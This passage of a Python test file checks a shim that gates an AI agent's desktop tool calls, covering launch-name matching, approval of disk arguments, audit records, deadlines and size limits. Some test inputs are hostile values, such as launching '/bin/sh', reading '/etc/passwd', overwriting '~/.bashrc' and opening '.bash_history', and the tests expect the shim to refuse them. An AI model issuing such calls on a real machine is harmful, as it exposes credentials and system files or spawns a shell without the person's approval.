    assert [call["tool"] for call in _records(fake_log, "call")] == ["launch_app"]


_LINUX_APPS = [
    ("Zebra Notes", "org.example.ZebraNotes"),
    ("Éditeur", "org.example.Editeur"),
    ("Mousepad", None),
]


@pytest.mark.parametrize(
    ("name", "matches"),
    [
        ("Zebra Notes", True),
        ("zebra notes", True),
        ("ZEBRA NOTES", True),
        ("org.example.ZebraNotes", True),
        ("ORG.EXAMPLE.ZEBRANOTES", True),
        ("ÉDITEUR", True),
        ("Mousepad", True),
        # The driver folds ASCII letters only.
        ("éditeur", False),
        # Its other matches can change before it looks (part of a name
        # another app installed meanwhile also has), so they don't count,
        # and it keeps the spaces.
        ("Zebra", False),
        (" Zebra Notes", False),
        ("invoice.pdf", False),
        ("..", False),
        ("", False),
    ],
)
def test_a_linux_launch_name_matches_an_app_as_the_driver_always_does(
    name: str, matches: bool
) -> None:
    """cua-driver 0.38 on Linux, once no program has the name's first word:
    an installed app's display name or desktop-file id, ignoring ASCII case."""
    assert catalog.linux_app_name_matches(name, _LINUX_APPS) is matches


@pytest.mark.parametrize("name", ["invoice.pdf", ".bash_history", "..", "Zebra", "logoff"])
async def test_a_linux_launch_by_a_name_no_app_has_never_reaches_the_driver(
    make_handler, fake_log, monkeypatch, name: str
) -> None:
    """On Linux cua-driver hands a name that no program has and no installed
    app matches to xdg-open when a file or folder of that name is in its
    working folder, the person's home under systemd: `.bash_history` opened
    in an editor, for a screenshot to read, past the path jail and the
    approval `urls` needs. A running process of that name, which no
    installed app matched, doesn't count."""
    monkeypatch.setenv(
        "FAKE_CUA_APPS",
        json.dumps([{"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}]),
    )
    handler = make_handler(platform="linux")

    response = await handler.handle(_call("launch_app", {"name": name}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
    assert response.payload.details == {"tool": "launch_app", "argument": "name"}
    assert [call["tool"] for call in _records(fake_log, "call")] == ["list_apps"]


async def test_a_linux_launch_by_an_installed_apps_name_or_id_goes_ahead(
    make_handler, fake_log, monkeypatch
) -> None:
    monkeypatch.setenv(
        "FAKE_CUA_APPS",
        json.dumps([{"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}]),
    )
    handler = make_handler(platform="linux")

    first = await handler.handle(_call("launch_app", {"name": "zebra notes"}))
    second = await handler.handle(_call("launch_app", {"name": "org.example.ZebraNotes"}))

    for response in (first, second):
        assert isinstance(response, ComputerToolResultMessage)
        assert response.payload.is_error is False
    # The installed apps are listed for each launch by name.
    assert [call["tool"] for call in _records(fake_log, "call")] == [
        "list_apps",
        "launch_app",
        "list_apps",
        "launch_app",
    ]


async def test_a_launchs_name_is_looked_up_on_path_off_the_event_loop(
    make_handler, fake_log, monkeypatch
) -> None:
    """On Linux a launch's name is looked up on PATH (shutil.which), which
    stats a file in each of its folders. A stalled mount there (NFS, FUSE)
    holds a stat for as long as it stalls, and on the event loop it held
    every session's work and keepalive with it."""
    monkeypatch.setenv(
        "FAKE_CUA_APPS",
        json.dumps([{"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}]),
    )
    loop_thread = threading.get_ident()
    looked_up_from: list[int] = []
    check = handlers_module.check_arguments

    def look_up(word: str) -> str | None:
        # A PATH where no program has the name.
        looked_up_from.append(threading.get_ident())
        return None

    def checked_as_on_linux(tool: str, arguments: Any, approved: Any = (), *, on_path) -> None:
        # Linux's check on every OS.
        check(tool, arguments, approved, platform="linux", on_path=on_path)

    monkeypatch.setattr(handlers_module, "check_arguments", checked_as_on_linux)
    monkeypatch.setattr(handlers_module, "_program_on_path", look_up)
    handler = make_handler(platform="linux")

    response = await handler.handle(_call("launch_app", {"name": "Zebra Notes"}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.is_error is False
    assert looked_up_from and loop_thread not in looked_up_from


async def test_a_launch_whose_name_lookup_stalls_lets_go_of_the_computer_by_its_deadline(
    make_handler, fake_log, monkeypatch
) -> None:
    """A Linux launch's name was looked up on PATH in a worker thread that
    the call waited for to the end, holding the computer: a stalled mount
    on PATH held every chat's calls behind it for as long as it stalled. The
    name is looked up before the call takes the computer now, and by its
    deadline: past it the call didn't start (COMMAND_TIMEOUT), though the
    lookup goes on to find a program, and calls that look nothing up go
    ahead. The machine makes one lookup at a time, so a launch of another
    name waits for the stalled one rather than start one that would stall
    too, and once the stall clears a launch looks its name up again."""
    monkeypatch.setenv(
        "FAKE_CUA_APPS",
        json.dumps([{"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}]),
    )
    released = threading.Event()
    looked_up: list[str] = []

    def stalled(word: str) -> str | None:
        looked_up.append(word)
        released.wait(timeout=60)
        return "/usr/bin/zebra" if word == "zebra" else None

    check = handlers_module.check_arguments

    def checked_as_on_linux(tool: str, arguments: Any, approved: Any = (), *, on_path=None):
        # Linux's check on every OS. Given no on_path, it looks names up
        # itself, as it did in its worker thread.
        check(tool, arguments, approved, platform="linux", on_path=on_path or stalled)

    monkeypatch.setattr(handlers_module, "check_arguments", checked_as_on_linux)
    monkeypatch.setattr(handlers_module, "_program_on_path", stalled, raising=False)
    handler = make_handler(platform="linux")
    try:
        launch = _call("launch_app", {"name": "zebra notes"}, timeout_seconds=1)
        stalled_launch = await asyncio.wait_for(handler.handle(launch), timeout=30)
        click = await asyncio.wait_for(handler.handle(_call("click", {"pid": 1})), timeout=30)
        another = _call("launch_app", {"name": "Zebra Notes"}, timeout_seconds=1)
        waited = await asyncio.wait_for(handler.handle(another), timeout=30)
        assert looked_up == ["zebra"]
    finally:
        released.set()

    for response in (stalled_launch, waited):
        assert isinstance(response, ErrorMessage)
        assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
        assert response.payload.details["started"] is False
    assert isinstance(click, ComputerToolResultMessage)
    assert click.payload.is_error is False
    launched = await asyncio.wait_for(
        handler.handle(_call("launch_app", {"name": "Zebra Notes"})), timeout=30
    )
    assert isinstance(launched, ComputerToolResultMessage)
    assert launched.payload.is_error is False
    assert looked_up == ["zebra", "Zebra"]
    assert [call["tool"] for call in _records(fake_log, "call")] == [
        "click",
        "list_apps",
        "launch_app",
    ]


@pytest.mark.parametrize(
    ("platform", "app"),
    [
        ("linux", {"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}),
        ("win32", "Notepad"),
    ],
)
async def test_a_launch_by_the_name_of_an_app_removed_since_it_was_listed_is_refused(
    make_handler, fake_log, monkeypatch, tmp_path, platform: str, app: Any
) -> None:
    """The installed apps were kept for a minute, so the name of an app
    removed meanwhile still went through. The driver, finding no app of that
    name, hands it on Linux to xdg-open when a file or folder of that name
    is in its working folder, and on Windows to ShellExecuteEx, which runs a
    program of that name from PATH, neither with the person's approval."""
    apps = tmp_path / "apps.json"
    apps.write_text(json.dumps([app]), encoding="utf-8")
    monkeypatch.setenv("FAKE_CUA_APPS_FILE", str(apps))
    name = app["name"] if isinstance(app, dict) else app
    handler = make_handler(platform=platform)

    first = await handler.handle(_call("launch_app", {"name": name}))
    apps.write_text("[]", encoding="utf-8")
    second = await handler.handle(_call("launch_app", {"name": name}))

    assert isinstance(first, ComputerToolResultMessage)
    assert first.payload.is_error is False
    assert isinstance(second, ErrorMessage)
    assert second.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
    assert second.payload.details == {"tool": "launch_app", "argument": "name"}
    assert [call["tool"] for call in _records(fake_log, "call")] == [
        "list_apps",
        "launch_app",
        "list_apps",
    ]


async def test_a_linux_launch_of_an_app_gone_by_the_time_the_driver_looks_opens_no_file(
    make_handler, fake_log, monkeypatch, tmp_path
) -> None:
    """The shim lets a Linux launch by name through only when an installed
    app has that name, but the driver looks again: an app removed between
    the two left the driver no app, and it handed the name to xdg-open,
    which opened a file of that name in its working folder, the shim's (the
    person's home, under systemd), past the path jail and the approval
    `urls` needs. In the driver's own empty folder the name finds nothing."""
    home = tmp_path / "home"
    home.mkdir()
    (home / "Zebra Notes").write_text("the person's notes", encoding="utf-8")
    monkeypatch.chdir(home)
    monkeypatch.setenv(
        "FAKE_CUA_APPS",
        json.dumps([{"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}]),
    )
    monkeypatch.setenv("FAKE_CUA_LINUX_LAUNCH", "1")
    monkeypatch.setenv("FAKE_CUA_APPS_GONE_AT_LAUNCH", "1")
    handler = make_handler(platform="linux")

    response = await handler.handle(_call("launch_app", {"name": "Zebra Notes"}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.is_error is True
    assert _records(fake_log, "xdg-open") == []
    assert [call["tool"] for call in _records(fake_log, "call")] == ["list_apps", "launch_app"]


@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("kill_app", {"pid": 1}),
        ("set_config", {}),
        ("clipboard_read", {}),
        ("check_permissions", {"prompt": True}),
        (
            "run_steps",
            {
                "steps": [{"tool": "move_cursor", "args": {"x": 1, "y": 1}}],
                "observe": {"pid": 1, "window_id": 2, "screenshot_out_file": "/home/me/.bashrc"},
            },
        ),
        # A batch whose steps the shim can't look inside; a number used to
        # end the call as INTERNAL_ERROR, with no audit record.
        ("run_steps", {"steps": 1}),
        ("run_steps", {"steps": {"0": {"tool": "move_cursor", "args": {"x": 1, "y": 1}}}}),
        ("run_steps", {"steps": [{"tool": "move_cursor", "args": {"x": 1, "y": 1}}, "garbage"]}),
        ("launch_app", {"name": "/bin/sh"}),
    ],
)
async def test_refused_calls_never_reach_the_driver(
    make_handler, fake_log, tmp_path, tool, arguments
) -> None:
    handler = make_handler()

    response = await handler.handle(_call(tool, arguments))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
    assert _records(fake_log, "call") == []
    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == ErrorCode.FEATURE_NOT_SUPPORTED.value


async def test_a_disk_argument_nobody_approved_never_reaches_the_driver(
    make_handler, fake_log, tmp_path
) -> None:
    handler = make_handler()

    response = await handler.handle(
        _call("get_window_state", {"pid": 1, "screenshot_out_file": "/home/me/.bashrc"})
    )

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert response.payload.details == {
        "tool": "get_window_state",
        "argument": "screenshot_out_file",
    }
    assert _records(fake_log, "call") == []
    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == ErrorCode.APPROVAL_REQUIRED.value


async def test_a_script_runs_only_once_the_person_approves_it(
    make_handler, fake_log, tmp_path
) -> None:
    """cua-driver 0.38's policy can't forbid one argument of a tool, and the
    shim can't see a script's calls, so a script could save a screenshot
    anywhere without the approval the same call needs on its own."""
    handler = make_handler()
    script = (
        'await cua.call("get_window_state", '
        '{pid: 1, window_id: 2, screenshot_out_file: "~/Desktop/shot.png"})'
    )

    waiting = await handler.handle(_call("run_script", {"script": script}))
    approved = await handler.handle(
        _call("run_script", {"script": script}, approved_arguments=["script"])
    )

    assert isinstance(waiting, ErrorMessage)
    assert waiting.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert waiting.payload.details == {"tool": "run_script", "argument": "script"}
    assert isinstance(approved, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["script"] == script


async def test_an_approved_disk_argument_is_relayed_and_audited_whole(
    make_handler, fake_log, tmp_path
) -> None:
    handler = make_handler()
    path = "/home/me/Documents/" + "quarterly-report-" * 20 + ".png"

    response = await handler.handle(
        _call(
            "get_window_state",
            {"pid": 1, "screenshot_out_file": path},
            approved_arguments=["screenshot_out_file"],
        )
    )

    assert isinstance(response, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["screenshot_out_file"] == path
    [record] = _audit(tmp_path)
    assert record["details"]["approved_arguments"] == ["screenshot_out_file"]
    # The audit keeps the whole path the person approved.
    assert record["details"]["arguments"]["screenshot_out_file"] == path


async def test_an_approval_name_the_tool_lacks_keeps_its_record_cut(
    make_handler, fake_log, tmp_path
) -> None:
    """Any approved_arguments entry turned the audit's cut off, so a call
    naming one the tool doesn't have, refused right after, had its long
    arguments written to the audit log whole, time after time."""
    handler = make_handler()
    url = "https://example.com/" + "a" * 5000

    response = await handler.handle(
        _call("browser_navigate", {"url": url}, approved_arguments=["screenshot_out_file"])
    )

    assert isinstance(response, ErrorMessage)
    assert _records(fake_log, "call") == []
    [record] = _audit(tmp_path)
    assert len(record["details"]["arguments"]["url"]) < 300


async def test_an_approval_covers_only_the_argument_it_names(make_handler, fake_log) -> None:
    handler = make_handler(enable_clipboard=True)

    response = await handler.handle(
        _call("clipboard_write", {"file_path": "/etc/passwd"}, approved_arguments=["image_path"])
    )

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert _records(fake_log, "call") == []


async def test_arguments_the_driver_rejects_come_back_for_the_model_to_fix(
    make_handler, tmp_path
) -> None:
    handler = make_handler()

    response = await handler.handle(_call("set_window_frame", {"pid": -4}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.is_error is True
    assert response.payload.content[0].text == "width must be positive"
    [record] = _audit(tmp_path)
    assert record["result"]["ok"] is True and record["details"]["is_error"] is True


async def test_another_driver_protocol_error_is_an_internal_error(make_handler, tmp_path) -> None:
    handler = make_handler()

    response = await handler.handle(_call("set_window_frame", {"pid": -5}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.INTERNAL_ERROR
    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == ErrorCode.INTERNAL_ERROR.value


async def test_what_launches_is_audited_whole(make_handler, tmp_path) -> None:
    handler = make_handler()
    long_argument = "--profile=" + "p" * 300

    await handler.handle(
        _call("launch_app", {"name": "Terminal", "additional_arguments": [long_argument]})
    )

    [record] = _audit(tmp_path)
    assert record["details"]["arguments"]["additional_arguments"] == [long_argument]


async def test_computer_use_off_refuses_everything(make_handler) -> None:
    handler = make_handler(enable_computer_use=False)

    response = await handler.handle(_call("click", {"pid": 1}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CAPABILITY_NOT_GRANTED


async def test_screenshots_are_relayed_up_to_the_rate_limit(make_handler) -> None:
    handler = make_handler(max_screenshots_per_minute=1)

    first = await handler.handle(_call("get_window_state", {"pid": 1}))
    second = await handler.handle(_call("get_window_state", {"pid": 1}))

    assert isinstance(first, ComputerToolResultMessage)
    images = [b for b in first.payload.content if isinstance(b, ComputerImageContent)]
    assert [image.mime_type for image in images] == ["image/png"]
    # The resource block the driver also sent is named, not relayed.
    texts = [b.text for b in first.payload.content if isinstance(b, ComputerTextContent)]
    assert texts[0] == "window" and "A resource block was left out." in texts
    assert isinstance(second, ComputerToolResultMessage)
    assert not [b for b in second.payload.content if isinstance(b, ComputerImageContent)]
    audit = [r["details"] for r in _audit(handler.config.audit_log_path.parent)]
    assert [(d["images"], d["images_withheld"]) for d in audit] == [(1, 0), (0, 1)]
    assert any("at most 1 a minute" in b.text for b in second.payload.content
               if isinstance(b, ComputerTextContent))  # fmt: skip


async def test_an_image_left_out_for_size_spends_none_of_the_rate_limit(
    make_handler, monkeypatch
) -> None:
    """The limiter, which every session on the machine shares, was charged
    before the size check, so full-size captures that never left the
    machine used it up and withheld the next screenshots, with a note
    blaming the rate."""
    from autogpt_local_executor import handlers

    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
    handler = make_handler(max_screenshots_per_minute=2)

    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 1000)
    too_large = [await handler.handle(_call("get_window_state", {"pid": 1})) for _ in range(3)]
    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 100_000)
    small = await handler.handle(_call("get_window_state", {"pid": 1}))

    for response in too_large:
        assert isinstance(response, ComputerToolResultMessage)
        texts = [b.text for b in response.payload.content if isinstance(b, ComputerTextContent)]
        assert any("too large" in text for text in texts)
        assert not any("a minute" in text for text in texts)
    assert isinstance(small, ComputerToolResultMessage)
    assert [b for b in small.payload.content if isinstance(b, ComputerImageContent)]


async def test_an_image_too_large_for_the_connection_is_left_out(make_handler, monkeypatch) -> None:
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 1000)
    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
    handler = make_handler()

    response = await handler.handle(_call("get_window_state", {"pid": 1}))

    assert isinstance(response, ComputerToolResultMessage)
    assert not [b for b in response.payload.content if isinstance(b, ComputerImageContent)]
    assert any("too large" in b.text for b in response.payload.content
               if isinstance(b, ComputerTextContent))  # fmt: skip
    # The audit record counted only images the rate limit held back, so it
    # said none were withheld.
    [record] = _audit(handler.config.audit_log_path.parent)
    assert (record["details"]["images"], record["details"]["images_withheld"]) == (0, 1)


async def test_an_image_past_the_negotiated_payload_limit_is_left_out(
    make_handler, monkeypatch
) -> None:
    """A result was held only to the frame's budget, so with a lower
    negotiated max_file_size_bytes, which bounds every operation's payload
    (PROTOCOL.md), a screenshot could exceed the limit the platform set."""
    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
    handler = make_handler()
    handler.config.max_file_size_bytes = 1000

    response = await handler.handle(_call("get_window_state", {"pid": 1}))

    assert isinstance(response, ComputerToolResultMessage)
    assert not [b for b in response.payload.content if isinstance(b, ComputerImageContent)]
    assert any("too large" in b.text for b in response.payload.content
               if isinstance(b, ComputerTextContent))  # fmt: skip


async def test_text_is_measured_as_json_writes_it(make_handler, monkeypatch) -> None:
    """The budget counted a text block's raw UTF-8 bytes, but JSON writes a
    control character as six bytes and a quote as two, so a result could
    pass the budget and still exceed the frame limit, and the whole result
    was then replaced with FILE_TOO_LARGE."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 1000)
    monkeypatch.setattr(handlers, "MAX_WIRE_TEXT_CONTENT_BYTES", 100)
    handler = make_handler()

    payload, _summary = handler._result_payload(
        "get_window_state", {"content": [{"type": "text", "text": "\x00" * 600}]}
    )

    texts = [b.text for b in payload.content if isinstance(b, ComputerTextContent)]
    assert sum(len(json.dumps(text, ensure_ascii=False).encode()) for text in texts) <= 1000
    assert any("cut down" in text for text in texts)


async def test_a_cut_down_result_fits_the_negotiated_limit_as_json(make_handler) -> None:
    """The last cut held the text to the budget in UTF-8 bytes, but JSON
    writes a control character as six: 600 NULs passed a 1,000-byte limit
    and took over 3,600 bytes on the wire. The notes added after the check
    weren't counted either."""
    handler = make_handler()
    handler.config.max_file_size_bytes = 1000

    payload, _summary = handler._result_payload(
        "get_window_state", {"content": [{"type": "text", "text": "\x00" * 600}]}
    )

    texts = [b.text for b in payload.content if isinstance(b, ComputerTextContent)]
    assert sum(len(json.dumps(text, ensure_ascii=False).encode()) for text in texts) <= 1000
    assert any("cut down" in text for text in texts)
    assert texts[0] and set(texts[0]) == {"\x00"}


@pytest.mark.parametrize("budget", [32, 120, 170, 200, 1000])
async def test_a_cut_down_result_fits_its_budget_as_sent(make_handler, budget: int) -> None:
    """The budget was held against the blocks' text alone, not the payload's
    fields or each block's wrapper, and the note added once the text was
    cut wasn't counted either: with max_file_size_bytes 32, a long text
    became an empty block and a note that alone took 196 bytes on the wire.
    Where not even the note fits, the smallest result the protocol allows
    goes, with no content."""
    handler = make_handler()
    handler.config.max_file_size_bytes = budget
    text = "z" * 5000

    payload, _summary = handler._result_payload(
        "get_window_state",
        {"content": [{"type": "text", "text": text}], "structuredContent": {"elements": []}},
    )

    def sent(result: ComputerToolResultPayload) -> int:
        return len(result.model_dump_json().encode("utf-8"))

    note = ComputerTextContent(text=handlers_module._CUT_DOWN_NOTE)
    if sent(ComputerToolResultPayload(tool="get_window_state", content=[note])) > budget:
        assert payload == ComputerToolResultPayload(tool="get_window_state")
    else:
        assert sent(payload) <= budget
        *texts, last = payload.content
        assert last == note
        assert all(isinstance(b, ComputerTextContent) and text.startswith(b.text) for b in texts)
        assert payload.structured_content is None


async def test_a_call_cancelled_again_while_its_driver_stops_keeps_the_turn(
    fake_log, monkeypatch
) -> None:
    """A call past its deadline stops the driver to end it, shielded from a
    further cancel. One cancelled again while the driver stopped let go of
    the turn at once, and the next call could start a second driver while
    the first still acted on the desktop."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "30")
    bridge = fake_bridge()
    stopping = asyncio.Event()
    stopped = asyncio.Event()
    real_stop = bridge._stop_unfinished

    async def slow_stop(client: Any) -> None:
        stopping.set()
        await stopped.wait()
        await real_stop(client)

    monkeypatch.setattr(bridge, "_stop_unfinished", slow_stop)
    call = asyncio.ensure_future(bridge.call_tool("drag", {"pid": -2}, timeout=1))
    try:
        await asyncio.wait_for(stopping.wait(), timeout=30)
        call.cancel()  # given up on again, while the driver stops
        for _ in range(20):
            await asyncio.sleep(0)
        assert call.done()
        assert bridge._turn.locked()
    finally:
        stopped.set()
    async with asyncio.timeout(10):
        while bridge._turn.locked():
            await asyncio.sleep(0.01)
    await bridge.close()


async def test_a_call_past_its_timeout_is_stopped_at_the_driver(
    make_handler, fake_log, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "3")
    handler = make_handler()

    response = await handler.handle(_call("drag", {"pid": -2}, timeout_seconds=1))
    after = await handler.handle(_call("click", {"pid": 1}))
    await asyncio.sleep(2.5)

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert "stopped cua-driver" in response.payload.message
    assert response.payload.details == {"tool": "drag", "timeout_seconds": 1, "started": True}
    assert isinstance(after, ComputerToolResultMessage)
    assert _records(fake_log, "slow_done") == []


async def test_a_call_kept_waiting_past_its_deadline_never_starts(
    make_handler, fake_log, monkeypatch
) -> None:
    """The deadline started only once the call had the computer, so a call
    queued behind another chat's could start its action after the platform
    had given up on it, on a screen that had changed since."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
    first = make_handler(session_id=None)
    second = make_handler(session_id="other-chat")
    first.share_with(second)
    slow = asyncio.create_task(first.handle(_call("drag", {"pid": -2}, timeout_seconds=30)))
    for _ in range(250):
        if _records(fake_log, "call"):
            break
        await asyncio.sleep(0.02)

    queued = await second.handle(_call("click", {"pid": 7}, timeout_seconds=1))
    await slow

    assert isinstance(queued, ErrorMessage)
    assert queued.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert queued.payload.details == {"tool": "click", "timeout_seconds": 1, "started": False}
    assert "Nothing ran" in queued.payload.message
    assert [r["tool"] for r in _records(fake_log, "call")] == ["drag"]


class _HeldAudit:
    """An audit writer whose writes wait until `go` is set, as one behind
    `autogpt-shim audit verify` on a large log does, recording each op."""

    def __init__(self) -> None:
        self.go = asyncio.Event()
        self.writing = asyncio.Event()
        self.written: list[str] = []

    async def write(self, op: str, **_kwargs: Any) -> None:
        self.writing.set()
        await self.go.wait()
        self.written.append(op)


async def test_a_call_whose_record_is_slow_to_write_leaves_the_computer_to_the_next(
    make_handler, fake_log
) -> None:
    """A call kept the computer, which every chat's calls take turns at,
    until its audit record was written, after the driver was done: an audit
    log held up (`autogpt-shim audit verify` on a large log, a slow disk)
    held every other chat's calls too, each until its deadline. The record
    is still written before the call's answer goes out."""
    first = make_handler(session_id=None)
    second = make_handler(session_id="other-chat")
    first.share_with(second)
    held = _HeldAudit()
    first.audit = held  # type: ignore[assignment]
    call = asyncio.create_task(first.handle(_call("click", {"pid": 7})))
    try:
        await asyncio.wait_for(held.writing.wait(), timeout=30)

        other = await second.handle(_call("click", {"pid": 8}, timeout_seconds=10))

        assert isinstance(other, ComputerToolResultMessage)
        assert not call.done()
    finally:
        held.go.set()
    response = await call

    assert isinstance(response, ComputerToolResultMessage)
    assert held.written == ["COMPUTER_TOOL_CALL"]
    assert [r["tool"] for r in _records(fake_log, "call")] == ["click", "click"]


class _HeldStart:
    """A client factory whose drivers don't finish starting until `go` is
    set, counting the starts."""

    def __init__(self) -> None:
        self.go = asyncio.Event()
        self.starting = asyncio.Event()
        self.started: list[StdioMcpClient] = []

    def __call__(self, argv: list[str], **kwargs: Any) -> StdioMcpClient:
        held = self

        class Held(StdioMcpClient):
            async def start(self, *, timeout: float) -> Any:
                held.starting.set()
                await held.go.wait()
                return await super().start(timeout=timeout)

        client = Held([sys.executable, *argv], **kwargs)
        self.started.append(client)
        return client


async def test_a_call_gives_up_on_a_slow_start_and_leaves_it_running(fake_log) -> None:
    """Starting the driver on a call's first use ignored the call's deadline,
    holding the driver's turn for as long as the start took, which kept
    HELLO's screen size and other chats' calls waiting past theirs. The
    start isn't stopped either: that would count against the restart
    budget."""
    held = _HeldStart()
    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=held,
    )
    try:
        first = asyncio.ensure_future(bridge.call_tool("get_screen_size", {}, timeout=0.3))
        done, _ = await asyncio.wait({first}, timeout=20)
        assert first in done
        with pytest.raises(driver.CallNotStarted):
            first.result()
        # The driver's turn is free, and the start goes on.
        assert not bridge._turn.locked()
        assert held.starting.is_set() and len(held.started) == 1

        held.go.set()
        result = await bridge.call_tool("get_screen_size", {}, timeout=30)

        assert result["structuredContent"]["width"] == 1920
        assert len(held.started) == 1
        assert held.started[0].alive
    finally:
        held.go.set()
        await bridge.close()


async def test_a_call_gives_up_on_a_display_check_that_hangs(fake_log) -> None:
    """Before each call the bridge looks at the desktop's display (systemctl,
    under the systemd service), in a thread, with no deadline: a look that
    hung, or waited for a thread while every one was busy, kept the call
    waiting past its deadline, holding the driver's turn every chat's calls
    share."""
    from unittest.mock import patch

    from autogpt_local_executor import platform_info

    read = _HeldDisplayRead()
    bridge = _bridge()
    try:
        with patch.object(platform_info, "session_display", read.display):
            call = asyncio.ensure_future(bridge.call_tool("get_screen_size", {}, timeout=0.3))
            done, _ = await asyncio.wait({call}, timeout=20)
            assert call in done
            with pytest.raises(driver.CallNotStarted):
                call.result()
            assert not bridge._turn.locked()
    finally:
        read.go.set()
        await bridge.close()


class _HeldDisplayRead:
    """The systemd service's look at the desktop's display (`display`),
    whose read of the manager's environment hangs until `go` is set, as
    systemctl's lookup on a stalled PATH mount does."""

    def __init__(self) -> None:
        from autogpt_local_executor import platform_info

        self.reads = 0
        self.go = threading.Event()
        self.display = platform_info.SessionDisplay(
            {"AUTOGPT_SHIM_SUPERVISOR": "systemd"}, read=self._read
        )

    def _read(self) -> dict[str, str] | None:
        self.reads += 1
        self.go.wait(60)
        return None


async def test_calls_that_give_up_on_a_display_check_that_hangs_hold_no_thread(
    fake_log,
) -> None:
    """A call that gave up on a display check that hung left its worker
    thread running the check, and each later call another, waiting for the
    lock the first held, until the threads every session's file and audit
    work shares were all held. The calls now wait for the one check under
    way, each until its own deadline, in no thread of their own."""
    from concurrent.futures import ThreadPoolExecutor
    from unittest.mock import patch

    from autogpt_local_executor import platform_info

    loop = asyncio.get_running_loop()
    loop.set_default_executor(ThreadPoolExecutor(max_workers=2))
    read = _HeldDisplayRead()
    bridge = _bridge()
    try:
        with patch.object(platform_info, "session_display", read.display):
            for _ in range(3):
                call = asyncio.ensure_future(bridge.call_tool("get_screen_size", {}, timeout=0.3))
                done, _ = await asyncio.wait({call}, timeout=20)
                assert call in done
                with pytest.raises(driver.CallNotStarted):
                    call.result()

            assert await asyncio.wait_for(asyncio.to_thread(lambda: "free"), timeout=20) == "free"
            assert read.reads == 1
    finally:
        read.go.set()
        await bridge.close()


async def test_a_start_goes_on_past_a_display_check_that_hangs(fake_log, monkeypatch) -> None:
    """HELLO waits for the owner's first start in full, and the start looked
    at the desktop's display first, with no deadline: a check that hung kept
    HELLO from going out, so the machine couldn't connect. The start waits
    for the check under way at most MANAGER_WAIT_SECONDS, and goes on with
    the display as it is."""
    from autogpt_local_executor import platform_info

    monkeypatch.setattr(platform_info, "MANAGER_WAIT_SECONDS", 0.2, raising=False)
    read = _HeldDisplayRead()
    monkeypatch.setattr(platform_info, "session_display", read.display)
    bridge = _bridge()
    try:
        snapshot = asyncio.ensure_future(bridge.snapshot())
        done, _ = await asyncio.wait({snapshot}, timeout=20)

        assert snapshot in done
        assert snapshot.result().info.name == "cua-driver"
    finally:
        read.go.set()
        await bridge.close()


async def test_a_call_whose_deadline_passes_while_the_driver_starts_never_runs(
    tmp_path, fake_log
) -> None:
    held = _HeldStart()
    config = _config(tmp_path)
    handler = ComputerUseHandler(
        config,
        audit=AuditWriter(config.audit_log_path, b"a" * 32),
        driver=CuaDriverBridge(
            tools=catalog.offered_tools(enable_clipboard=False),
            binary=FAKE,
            platform="linux",
            client_factory=held,
        ),
    )
    try:
        call = asyncio.ensure_future(handler.handle(_call("click", {"pid": 7}, timeout_seconds=1)))
        done, _ = await asyncio.wait({call}, timeout=20)
        assert call in done
        response = call.result()

        assert isinstance(response, ErrorMessage)
        assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
        assert response.payload.details == {"tool": "click", "timeout_seconds": 1, "started": False}
        assert "starting" in response.payload.message
        assert _records(fake_log, "call") == []
    finally:
        held.go.set()
        await handler.close()


async def test_the_deadline_counts_from_when_the_shim_received_the_call(
    make_handler, fake_log
) -> None:
    """Time already spent waiting for a request slot counts too."""
    handler = make_handler()
    received_at = asyncio.get_running_loop().time() - 5

    response = await handler.handle(
        _call("click", {"pid": 7}, timeout_seconds=2), received_at=received_at
    )

    assert isinstance(response, ErrorMessage)
    assert response.payload.details["started"] is False
    assert _records(fake_log, "call") == []


@pytest.mark.parametrize("width", ["NaN", "Infinity"])
async def test_a_screen_size_that_is_not_a_finite_number_is_left_out(
    make_handler, fake_log, monkeypatch, width: str
) -> None:
    """The driver's output is read with Python's json, which takes NaN and
    Infinity, and int() of either raised, so HELLO failed instead of going
